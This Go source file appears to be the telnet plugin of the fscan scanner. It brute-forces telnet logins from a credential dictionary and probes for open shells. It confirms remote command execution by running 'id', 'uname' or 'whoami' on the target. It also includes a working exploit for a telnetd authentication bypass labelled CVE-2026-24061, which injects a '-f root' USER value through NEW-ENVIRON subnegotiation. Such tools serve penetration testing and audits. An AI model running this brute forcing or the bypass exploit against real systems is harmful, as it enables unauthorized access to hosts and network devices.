//go:build plugin_telnet || !plugin_selective

package services

import (
	"context"
	"crypto/rand"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

// Telnet协议时间常量
const (
	telnetReadDelay       = 200 * time.Millisecond  // 读取间隔延迟
	telnetRetryDelay      = 500 * time.Millisecond  // 重试延迟
	telnetAuthDelay       = 1000 * time.Millisecond // 认证后等待延迟
	telnetReadTimeout     = 2 * time.Second         // 读取超时
	telnetBannerTimeout   = 3 * time.Second         // Banner读取超时
	telnetRCECmdTimeout   = 5 * time.Second         // RCE命令执行超时
	telnetRCEExtraTimeout = 10 * time.Second        // RCE验证额外超时
	telnetMaxAttempts     = 10                      // 最大尝试次数
)

// CVE-2026-24061 Telnet NEW-ENVIRON 选项常量
const (
	telnetIAC        = 0xFF // Telnet Interpret As Command
	telnetSB         = 0xFA // Subnegotiation Begin
	telnetSE         = 0xF0 // Subnegotiation End
	telnetNEWENVIRON = 39   // NEW-ENVIRON option
	telnetDO         = 0xFD // DO
	telnetDONT       = 0xFE // DONT
	telnetWILL       = 0xFB // WILL
	telnetWONT       = 0xFC // WONT
)

// TelnetPlugin Telnet扫描插件
type TelnetPlugin struct {
	plugins.BasePlugin
}

func NewTelnetPlugin() *TelnetPlugin {
	return &TelnetPlugin{
		BasePlugin: plugins.NewBasePlugin("telnet"),
	}
}

func (p *TelnetPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *ScanResult {
	config := session.Config
	target := info.Target()

	if config.DisableBrute {
		return p.identifyService(ctx, info, session)
	}

	// 检测未授权访问
	if result := p.testUnauthAccess(ctx, info, session); result != nil && result.Success {
		common.LogVuln(i18n.Tr("telnet_service", target, result.Banner))
		// 验证命令执行能力
		if ok, osType, evidence := p.verifyCommandExecution(ctx, info, "", "", session); ok {
			common.LogVuln(i18n.Tr("telnet_unauth_rce", target, osType, evidence))
		}
		return result
	}

	// 生成密码字典
	credentials := plugins.GenerateCredentials("telnet", config)
	if len(credentials) == 0 {
		return &ScanResult{
			Success: false,
			Service: "telnet",
			Error:   fmt.Errorf("没有可用的测试凭据"),
		}
	}

	// 转换凭据类型
	creds := make([]Credential, len(credentials))
	for i, c := range credentials {
		creds[i] = Credential{Username: c.Username, Password: c.Password}
	}

	// CVE-2026-24061: 并发检测 Telnetd Authentication Bypass 漏洞
	if cveResult := p.checkCVE202624061Concurrent(ctx, info, session, config); cveResult != nil {
		return cveResult
	}

	// 使用公共框架进行并发凭据测试
	authFn := p.createAuthFunc(info, session)
	testConfig := DefaultConcurrentTestConfigWithTarget(config, info)

	result := TestCredentialsConcurrently(ctx, creds, authFn, "telnet", testConfig)

	if result.Success {
		common.LogVuln(i18n.Tr("telnet_credential", target, result.Username, result.Password))
		// 验证命令执行能力
		if ok, osType, evidence := p.verifyCommandExecution(ctx, info, result.Username, result.Password, session); ok {
			common.LogVuln(i18n.Tr("telnet_credential_rce", target, result.Username, result.Password, osType, evidence))
		}
	}

	return result
}

// createAuthFunc 创建Telnet认证函数
func (p *TelnetPlugin) createAuthFunc(info *common.HostInfo, session *common.ScanSession) AuthFunc {
	return func(ctx context.Context, cred Credential) *AuthResult {
		return p.doTelnetAuth(ctx, info, cred, session)
	}
}

// doTelnetAuth 执行Telnet认证
func (p *TelnetPlugin) doTelnetAuth(ctx context.Context, info *common.HostInfo, cred Credential, session *common.ScanSession) *AuthResult {
	target := info.Target()

	resultChan := make(chan *AuthResult, 1)

	go func() {
		conn, err := session.DialTCP(ctx, "tcp", target, session.Config.Timeout)
		if err != nil {
			resultChan <- &AuthResult{
				Success:   false,
				ErrorType: classifyTelnetErrorType(err),
				Error:     err,
			}
			return
		}

		_ = conn.SetDeadline(time.Now().Add(session.Config.Timeout))

		if p.performTelnetAuth(conn, cred.Username, cred.Password) {
			resultChan <- &AuthResult{
				Success:   true,
				Conn:      &telnetConnWrapper{conn},
				ErrorType: ErrorTypeUnknown,
				Error:     nil,
			}
		} else {
			_ = conn.Close()
			resultChan <- &AuthResult{
				Success:   false,
				ErrorType: ErrorTypeAuth,
				Error:     fmt.Errorf("认证失败"),
			}
		}
	}()

	select {
	case result := <-resultChan:
		return result
	case <-ctx.Done():
		// context 被取消，启动清理协程等待并关闭可能创建的连接
		go func() {
			result := <-resultChan
			if result != nil && result.Conn != nil {
				_ = result.Conn.Close()
			}
		}()
		return &AuthResult{
			Success:   false,
			ErrorType: ErrorTypeNetwork,
			Error:     ctx.Err(),
		}
	}
}

// telnetConnWrapper 包装Telnet连接以实现io.Closer
type telnetConnWrapper struct {
	conn net.Conn
}

func (w *telnetConnWrapper) Close() error {
	return w.conn.Close()
}

// classifyTelnetErrorType Telnet错误分类
func classifyTelnetErrorType(err error) ErrorType {
	if err == nil {
		return ErrorTypeUnknown
	}

	telnetAuthErrors := []string{
		"authentication failed",
		"authentication failure",
		"auth failed",
		"login failed",
		"invalid credentials",
		"invalid password",
		"invalid username",
		"access denied",
		"login incorrect",
		"permission denied",
		"bad password",
		"wrong password",
		"incorrect login",
		"login failure",
		"invalid login",
		"authentication error",
		"unauthorized",
		"credentials rejected",
	}

	return ClassifyError(err, telnetAuthErrors, CommonNetworkErrors)
}

// testUnauthAccess 测试Telnet未授权访问
func (p *TelnetPlugin) testUnauthAccess(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *ScanResult {
	target := info.Target()

	resultChan := make(chan *ScanResult, 1)

	go func() {
		conn, err := session.DialTCP(ctx, "tcp", target, session.Config.Timeout)
		if err != nil {
			resultChan <- nil
			return
		}
		defer func() { _ = conn.Close() }()

		_ = conn.SetDeadline(time.Now().Add(session.Config.Timeout))

		buffer := make([]byte, 1024)
		attempts := 0
		maxAttempts := telnetMaxAttempts

		for attempts < maxAttempts {
			attempts++

			_ = conn.SetReadDeadline(time.Now().Add(telnetBannerTimeout))
			n, err := conn.Read(buffer)
			if err != nil {
				time.Sleep(telnetRetryDelay)
				continue
			}

			response := string(buffer[:n])
			cleaned := p.cleanResponse(response)
			cleanedLower := strings.ToLower(cleaned)

			p.handleIACNegotiation(conn, buffer[:n])

			if p.isShellPrompt(cleaned) {
				resultChan <- &ScanResult{
					Success: true,
					Type:    plugins.ResultTypeVuln,
					Service: "telnet",
					Banner:  "Telnet远程终端服务 (未授权访问)",
				}
				return
			}

			if strings.Contains(cleanedLower, "login") ||
				strings.Contains(cleanedLower, "username") ||
				strings.Contains(cleaned, ":") {
				break
			}

			time.Sleep(telnetRetryDelay)
		}

		resultChan <- nil
	}()

	select {
	case result := <-resultChan:
		return result
	case <-ctx.Done():
		return nil
	}
}

// performTelnetAuth 执行Telnet认证
func (p *TelnetPlugin) performTelnetAuth(conn net.Conn, username, password string) bool {
	buffer := make([]byte, 1024)

	loginPromptReceived := false
	attempts := 0
	maxAttempts := telnetMaxAttempts

	for attempts < maxAttempts && !loginPromptReceived {
		attempts++

		_ = conn.SetReadDeadline(time.Now().Add(telnetReadTimeout))
		n, err := conn.Read(buffer)
		if err != nil {
			time.Sleep(telnetReadDelay)
			continue
		}

		response := string(buffer[:n])
		p.handleIACNegotiation(conn, buffer[:n])
		cleaned := p.cleanResponse(response)
		cleanedLower := strings.ToLower(cleaned)

		if p.isShellPrompt(cleaned) {
			return true
		}

		if strings.Contains(cleanedLower, "login") ||
			strings.Contains(cleanedLower, "username") ||
			strings.Contains(cleaned, ":") {
			loginPromptReceived = true
			break
		}

		time.Sleep(telnetReadDelay)
	}

	if !loginPromptReceived {
		return false
	}

	_, err := conn.Write([]byte(username + "\r\n"))
	if err != nil {
		return false
	}

	time.Sleep(telnetRetryDelay)
	passwordPromptReceived := false
	attempts = 0
	maxPasswordAttempts := 5

	for attempts < maxPasswordAttempts && !passwordPromptReceived {
		attempts++

		_ = conn.SetReadDeadline(time.Now().Add(telnetReadTimeout))
		n, readErr := conn.Read(buffer)
		if readErr != nil {
			time.Sleep(telnetReadDelay)
			continue
		}

		response := string(buffer[:n])
		cleaned := p.cleanResponse(response)

		if strings.Contains(strings.ToLower(cleaned), "password") ||
			strings.Contains(cleaned, ":") {
			passwordPromptReceived = true
			break
		}

		time.Sleep(telnetReadDelay)
	}

	if !passwordPromptReceived {
		return false
	}

	_, err = conn.Write([]byte(password + "\r\n"))
	if err != nil {
		return false
	}

	time.Sleep(telnetAuthDelay)
	attempts = 0
	maxResultAttempts := 5

	for attempts < maxResultAttempts {
		attempts++

		_ = conn.SetReadDeadline(time.Now().Add(telnetReadTimeout))
		n, err := conn.Read(buffer)
		if err != nil {
			time.Sleep(telnetReadDelay)
			continue
		}

		response := string(buffer[:n])
		cleaned := p.cleanResponse(response)

		if p.isLoginSuccess(cleaned) {
			return true
		}

		if p.isLoginFailed(cleaned) {
			return false
		}

		time.Sleep(telnetReadDelay)
	}

	return false
}

// handleIACNegotiation 处理IAC协商
func (p *TelnetPlugin) handleIACNegotiation(conn net.Conn, data []byte) {
	for i := 0; i < len(data); i++ {
		if data[i] == 255 && i+2 < len(data) {
			cmd := data[i+1]
			opt := data[i+2]

			switch cmd {
			case 251: // WILL
				_, _ = conn.Write([]byte{255, 254, opt})
			case 253: // DO
				_, _ = conn.Write([]byte{255, 252, opt})
			}
			i += 2
		}
	}
}

// cleanResponse 清理telnet响应中的IAC命令
func (p *TelnetPlugin) cleanResponse(data string) string {
	var result strings.Builder

	for i := 0; i < len(data); i++ {
		b := data[i]
		if b == 255 && i+2 < len(data) {
			i += 2
			continue
		}
		if (b >= 32 && b <= 126) || b == '\r' || b == '\n' || b == '\t' {
			result.WriteByte(b)
		}
	}

	return strings.TrimSpace(result.String())
}

// isShellPrompt 检查是否为shell提示符
func (p *TelnetPlugin) isShellPrompt(data string) bool {
	if data == "" {
		return false
	}

	data = strings.ToLower(strings.TrimSpace(data))

	shellPrompts := []string{"$", "#", ">", "~$", "]$", ")#", "bash", "shell", "cmd"}

	for _, prompt := range shellPrompts {
		if strings.Contains(data, prompt) {
			return true
		}
	}

	return false
}

// isLoginSuccess 检查登录是否成功
func (p *TelnetPlugin) isLoginSuccess(data string) bool {
	if data == "" {
		return false
	}

	data = strings.ToLower(strings.TrimSpace(data))

	if p.isShellPrompt(data) {
		return true
	}

	successIndicators := []string{
		"welcome", "last login", "successful", "logged in",
		"login successful", "authentication successful",
		"welcome to", "successfully logged", "login ok",
		"connected to", "logged on",
	}

	for _, indicator := range successIndicators {
		if strings.Contains(data, indicator) {
			return true
		}
	}

	return false
}

// isLoginFailed 检查登录是否失败
func (p *TelnetPlugin) isLoginFailed(data string) bool {
	if data == "" {
		return false
	}

	data = strings.ToLower(strings.TrimSpace(data))

	failureIndicators := []string{
		"incorrect", "failed", "denied", "invalid", "wrong", "bad", "error",
		"authentication failed", "login failed", "access denied",
		"permission denied", "authentication error", "login incorrect",
		"invalid password", "invalid username", "unauthorized",
		"login failure", "connection refused",
	}

	for _, indicator := range failureIndicators {
		if strings.Contains(data, indicator) {
			return true
		}
	}

	repeatPrompts := []string{"login:", "username:", "user:", "name:"}

	for _, prompt := range repeatPrompts {
		if strings.Contains(data, prompt) {
			return true
		}
	}

	return false
}

// identifyService Telnet服务识别
func (p *TelnetPlugin) identifyService(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *ScanResult {
	target := info.Target()

	resultChan := make(chan *ScanResult, 1)

	go func() {
		conn, err := session.DialTCP(ctx, "tcp", target, session.Config.Timeout)
		if err != nil {
			resultChan <- &ScanResult{
				Success: false,
				Service: "telnet",
				Error:   err,
			}
			return
		}
		defer func() { _ = conn.Close() }()

		_ = conn.SetDeadline(time.Now().Add(session.Config.Timeout))

		buffer := make([]byte, 2048)
		n, err := conn.Read(buffer)
		if err != nil {
			resultChan <- &ScanResult{
				Success: false,
				Service: "telnet",
				Error:   err,
			}
			return
		}

		p.handleIACNegotiation(conn, buffer[:n])
		cleaned := p.cleanResponse(string(buffer[:n]))
		cleanedLower := strings.ToLower(cleaned)

		var banner string

		if p.isShellPrompt(cleaned) {
			banner = "Telnet远程终端服务 (未授权访问)"
		} else if strings.Contains(cleanedLower, "login") ||
			strings.Contains(cleanedLower, "username") ||
			strings.Contains(cleanedLower, "user") {
			banner = "Telnet远程终端服务 (需要认证)"
		} else if strings.Contains(cleanedLower, "password") {
			banner = "Telnet远程终端服务 (只需密码)"
		} else if cleaned != "" {
			displayCleaned := cleaned
			if len(displayCleaned) > 50 {
				displayCleaned = displayCleaned[:50] + "..."
			}
			banner = fmt.Sprintf("Telnet远程终端服务 (自定义欢迎: %s)", displayCleaned)
		} else {
			banner = "Telnet远程终端服务"
		}

		if p.isShellPrompt(cleaned) {
			common.LogVuln(i18n.Tr("telnet_service", target, banner))
		} else {
			common.LogSuccess(i18n.Tr("telnet_service", target, banner))
		}

		resultChan <- &ScanResult{
			Success: true,
			Type:    plugins.ResultTypeService,
			Service: "telnet",
			Banner:  banner,
		}
	}()

	select {
	case result := <-resultChan:
		return result
	case <-ctx.Done():
		return &ScanResult{
			Success: false,
			Service: "telnet",
			Error:   ctx.Err(),
		}
	}
}

// verifyCommandExecution 验证Telnet命令执行能力（RCE检测）
func (p *TelnetPlugin) verifyCommandExecution(ctx context.Context, info *common.HostInfo, username, password string, session *common.ScanSession) (bool, string, string) {
	target := info.Target()

	type rceResult struct {
		ok       bool
		osType   string
		evidence string
	}

	resultChan := make(chan rceResult, 1)

	go func() {
		conn, err := session.DialTCP(ctx, "tcp", target, session.Config.Timeout)
		if err != nil {
			resultChan <- rceResult{}
			return
		}
		defer func() { _ = conn.Close() }()

		_ = conn.SetDeadline(time.Now().Add(session.Config.Timeout + telnetRCEExtraTimeout))

		// 需要认证时先登录
		if username != "" || password != "" {
			if !p.performTelnetAuth(conn, username, password) {
				resultChan <- rceResult{}
				return
			}
		} else {
			// 未授权访问：等待并消费初始 banner/prompt
			p.drainBuffer(conn)
		}

		// 等待 shell 稳定后清空缓冲区
		time.Sleep(telnetRetryDelay)
		p.drainBuffer(conn)

		// 尝试 Linux/Unix 命令
		output, err := p.sendCommand(conn, "echo CMD_START && id && uname -a && echo CMD_END\r\n", telnetRCECmdTimeout)
		if err == nil && strings.Contains(output, "CMD_START") {
			if osType := p.detectOSType(output); osType != "" {
				resultChan <- rceResult{true, osType, p.extractEvidence(output)}
				return
			}
		}

		// 尝试 Windows 命令
		output, err = p.sendCommand(conn, "echo CMD_START && whoami && ver && echo CMD_END\r\n", telnetRCECmdTimeout)
		if err == nil && strings.Contains(output, "CMD_START") {
			lower := strings.ToLower(output)
			if strings.Contains(lower, "windows") || strings.Contains(lower, "microsoft") {
				resultChan <- rceResult{true, "Windows", p.extractEvidence(output)}
				return
			}
		}

		// 尝试网络设备命令
		output, err = p.sendCommand(conn, "show version\r\n", telnetRCECmdTimeout)
		if err == nil {
			if strings.Contains(output, "Cisco IOS") {
				resultChan <- rceResult{true, "Cisco IOS", p.extractEvidence(output)}
				return
			}
			if strings.Contains(output, "Huawei") || strings.Contains(output, "VRP") {
				resultChan <- rceResult{true, "Huawei VRP", p.extractEvidence(output)}
				return
			}
		}

		resultChan <- rceResult{}
	}()

	select {
	case r := <-resultChan:
		return r.ok, r.osType, r.evidence
	case <-ctx.Done():
		return false, "", ""
	}
}

// sendCommand 发送命令并读取输出
func (p *TelnetPlugin) sendCommand(conn net.Conn, cmd string, timeout time.Duration) (string, error) {
	_ = conn.SetWriteDeadline(time.Now().Add(timeout))
	if _, err := conn.Write([]byte(cmd)); err != nil {
		return "", err
	}

	time.Sleep(telnetAuthDelay)

	_ = conn.SetReadDeadline(time.Now().Add(timeout))
	var result strings.Builder
	buffer := make([]byte, 4096)

	// 多次读取以收集完整输出
	for i := 0; i < 3; i++ {
		n, err := conn.Read(buffer)
		if n > 0 {
			p.handleIACNegotiation(conn, buffer[:n])
			result.WriteString(p.cleanResponse(string(buffer[:n])))
		}
		if err != nil {
			break
		}
		time.Sleep(telnetReadDelay)
	}

	return result.String(), nil
}

// detectOSType 从命令输出推断系统类型
func (p *TelnetPlugin) detectOSType(output string) string {
	lower := strings.ToLower(output)

	if strings.Contains(output, "uid=") || strings.Contains(output, "gid=") {
		if strings.Contains(lower, "busybox") {
			return "Linux/BusyBox"
		}
		return "Linux"
	}

	if strings.Contains(lower, "linux") || strings.Contains(lower, "gnu") {
		return "Linux"
	}

	if strings.Contains(lower, "windows") || strings.Contains(lower, "microsoft") {
		return "Windows"
	}

	if strings.Contains(output, "Cisco IOS") {
		return "Cisco IOS"
	}

	if strings.Contains(output, "Huawei") || strings.Contains(output, "VRP") {
		return "Huawei VRP"
	}

	return ""
}

// extractEvidence 从命令输出中提取关键证据信息
func (p *TelnetPlugin) extractEvidence(output string) string {
	lines := strings.Split(strings.TrimSpace(output), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || line == "CMD_START" || line == "CMD_END" {
			continue
		}
		// 跳过回显的命令本身
		if strings.HasPrefix(line, "echo ") || strings.HasPrefix(line, "id") || strings.HasPrefix(line, "show ") {
			continue
		}
		if len(line) > 100 {
			return line[:100] + "..."
		}
		return line
	}
	return ""
}

// drainBuffer 消费连接中的待读数据
func (p *TelnetPlugin) drainBuffer(conn net.Conn) {
	buf := make([]byte, 4096)
	_ = conn.SetReadDeadline(time.Now().Add(telnetReadTimeout))
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			p.handleIACNegotiation(conn, buf[:n])
		}
		if err != nil {
			break
		}
	}
}

// checkCVE202624061Concurrent 并发检测多个用户，首个命中即返回
func (p *TelnetPlugin) checkCVE202624061Concurrent(ctx context.Context, info *common.HostInfo, session *common.ScanSession, config *common.Config) *ScanResult {
	cveUsers := config.Credentials.Userdict["telnet"]
	if len(cveUsers) == 0 {
		cveUsers = []string{"root", "admin", "administrator"}
	}

	type cveHit struct {
		user     string
		evidence string
	}

	ctx, cancel := context.WithCancel(ctx)
	defer cancel()

	ch := make(chan cveHit, 1)
	var wg sync.WaitGroup

	for _, user := range cveUsers {
		wg.Add(1)
		go func(u string) {
			defer wg.Done()
			if vuln, cveUser, evidence := p.checkCVE202624061(ctx, info, session, u); vuln {
				select {
				case ch <- cveHit{user: cveUser, evidence: evidence}:
					cancel() // 通知其他 goroutine 停止
				default:
				}
			}
		}(user)
	}

	// 等待全部完成后关闭 channel
	go func() {
		wg.Wait()
		close(ch)
	}()

	if hit, ok := <-ch; ok {
		target := info.Target()
		common.LogVuln(i18n.Tr("telnet_cve202624061", target, hit.user, hit.evidence))
		return &ScanResult{
			Success: true,
			Type:    plugins.ResultTypeVuln,
			Service: "telnet",
			Banner:  fmt.Sprintf("CVE-2026-24061 Telnetd Authentication Bypass (user: %s)", hit.user),
		}
	}
	return nil
}

// checkCVE202624061 检测 CVE-2026-24061 Telnetd Authentication Bypass 漏洞
// 利用 NEW-ENVIRON (option 39) 子协商注入恶意环境变量,实现认证绕过
// 返回 (是否漏洞, 触发用户名, 证据)
func (p *TelnetPlugin) checkCVE202624061(ctx context.Context, info *common.HostInfo, session *common.ScanSession, user string) (bool, string, string) {
	conn, err := session.DialTCP(ctx, "tcp", info.Target(), session.Config.Timeout)
	if err != nil {
		return false, "", ""
	}
	defer conn.Close()

	chk := &cveChecker{
		conn: conn,
		user: user,
		buf:  make([]byte, 4096),
	}
	return chk.run()
}

// cveChecker CVE-2026-24061 检测器 (基于验证过的 POC 逻辑)
type cveChecker struct {
	conn        net.Conn
	user        string
	exploitSent bool
	buf         []byte
}

// sendPayload 发送 NEW-ENVIRON 恶意环境变量 payload
func (e *cveChecker) sendPayload() {
	payload := []byte{telnetIAC, telnetSB, telnetNEWENVIRON, 0, 0}
	payload = append(payload, []byte("USER")...)
	payload = append(payload, 1) // SEND indicator
	payload = append(payload, []byte("-f "+e.user)...)
	payload = append(payload, telnetIAC, telnetSE)
	_, _ = e.conn.Write(payload)
	e.exploitSent = true
}

// sendSubResp 响应服务端子协商请求
func (e *cveChecker) sendSubResp(opt byte, data []byte) {
	resp := []byte{telnetIAC, telnetSB, opt, 0}
	resp = append(resp, data...)
	resp = append(resp, telnetIAC, telnetSE)
	_, _ = e.conn.Write(resp)
}

// parseIAC 解析 Telnet IAC 协商报文,返回非 IAC 数据部分
func (e *cveChecker) parseIAC(data []byte) []byte {
	var output []byte
	i := 0
	for i < len(data) {
		if data[i] != telnetIAC {
			output = append(output, data[i])
			i++
			continue
		}
		i++
		if i >= len(data) {
			break
		}
		cmd := data[i]
		i++
		if cmd == telnetIAC {
			output = append(output, 0xFF) // IAC 转义
			continue
		}
		// 子协商 (SB)
		if cmd == telnetSB {
			if i >= len(data) {
				break
			}
			sbOpt := data[i]
			i++
			var sbData []byte
			for i < len(data)-1 {
				if data[i] == telnetIAC && data[i+1] == telnetSE {
					i += 2
					break
				}
				sbData = append(sbData, data[i])
				i++
			}
			// 服务端要求回显数据 (SEND indicator = 1)
			if len(sbData) > 0 && sbData[0] == 1 {
				switch sbOpt {
				case 24:
					e.sendSubResp(24, []byte("xterm"))
				case 32:
					e.sendSubResp(32, []byte("38400,38400"))
				case telnetNEWENVIRON:
					if !e.exploitSent {
						e.sendPayload()
					}
				}
			}
			continue
		}
		// DO/DONT/WILL/WONT 协商
		if cmd == telnetDO || cmd == telnetDONT || cmd == telnetWILL || cmd == telnetWONT {
			if i >= len(data) {
				break
			}
			opt := data[i]
			i++
			switch cmd {
			case telnetDO:
				if opt == 24 || opt == 32 || opt == telnetNEWENVIRON {
					_, _ = e.conn.Write([]byte{telnetIAC, telnetWILL, opt})
				} else {
					_, _ = e.conn.Write([]byte{telnetIAC, telnetWONT, opt})
				}
			case telnetWILL:
				if opt == 1 || opt == 3 {
					_, _ = e.conn.Write([]byte{telnetIAC, telnetDO, opt})
				} else {
					_, _ = e.conn.Write([]byte{telnetIAC, telnetDONT, opt})
				}
			case telnetWONT:
				_, _ = e.conn.Write([]byte{telnetIAC, telnetDONT, opt})
			case telnetDONT:
				_, _ = e.conn.Write([]byte{telnetIAC, telnetWONT, opt})
			}
		}
	}
	return output
}

// readAll 读取连接中的所有可用数据，deadline 控制等待上限
func (e *cveChecker) readAll(timeout time.Duration) []byte {
	var out []byte
	_ = e.conn.SetReadDeadline(time.Now().Add(timeout))
	for {
		n, err := e.conn.Read(e.buf)
		if n > 0 {
			out = append(out, e.parseIAC(e.buf[:n])...)
			// 收到数据后缩短后续等待，快速收完尾包
			_ = e.conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
		}
		if err != nil {
			break
		}
	}
	return out
}

// genToken 生成 16 位随机验证 token
func (e *cveChecker) genToken() string {
	b := make([]byte, 8)
	_, _ = rand.Read(b)
	return fmt.Sprintf("%x", b)
}

// extractEvidence 从输出中提取包含关键词的完整行作为证据,清理 \r 控制字符
func (e *cveChecker) extractEvidence(data string, keywords []string) string {
	for _, kw := range keywords {
		for _, line := range strings.Split(data, "\n") {
			line = strings.TrimSpace(strings.ReplaceAll(line, "\r", ""))
			if line != "" && strings.Contains(line, kw) {
				return "[" + line + "]"
			}
		}
	}
	return ""
}

// run 执行 CVE-2026-24061 检测流程
// 优先级: id 命令输出 > echo token 回显
func (e *cveChecker) run() (bool, string, string) {
	// 阶段 1: IAC 协商（deadline 控制，不 sleep）
	_ = e.conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	for {
		n, err := e.conn.Read(e.buf)
		if err != nil {
			break
		}
		out := e.parseIAC(e.buf[:n])
		if len(out) > 0 || e.exploitSent {
			break
		}
	}

	// 协商未触发 exploit 则主动发送
	if !e.exploitSent {
		e.sendPayload()
		e.readAll(500 * time.Millisecond) // 消费协商回包
	}

	// 阶段 2: id 命令检测
	_, _ = e.conn.Write([]byte("id\n"))
	idOutput := string(e.readAll(2 * time.Second))

	evidence := e.extractEvidence(idOutput, []string{"uid=", "gid="})
	if evidence != "" {
		return true, e.user, evidence
	}

	// 阶段 3: echo token 验证
	token := e.genToken()
	_, _ = e.conn.Write([]byte("echo " + token + "\n"))
	result := string(e.readAll(1500 * time.Millisecond))
	stripped := strings.Replace(result, "echo "+token, "", 1)
	if strings.Contains(stripped, token) {
		return true, e.user, "[echo " + token + "]"
	}

	return false, "", ""
}

func init() {
	RegisterPluginWithPorts("telnet", func() Plugin {
		return NewTelnetPlugin()
	}, []int{23, 2323})
}
